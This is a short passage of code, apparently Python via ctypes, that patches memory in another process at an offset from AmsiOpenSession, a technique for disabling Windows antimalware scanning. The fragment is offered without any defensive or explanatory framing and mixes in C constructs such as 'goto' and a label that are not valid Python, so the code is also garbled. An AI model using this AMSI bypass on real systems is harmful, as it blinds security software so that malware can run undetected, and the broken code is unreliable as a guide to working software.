    patched_address = (ctypes.c_ulonglong)(pfnAmsiOpenSession) + address
    if not ctypes.windll.kernel32.WriteProcessMemory(hProcess, (ctypes.LPVOID)(patched_address), AmsiPatch, 1, None):
        goto EXIT_ROUTINE

    return True

EXIT_ROUTINE:
    if hProcess!= None:
        ctypes.windll.kernel32.CloseHandle(hProcess)

    return False
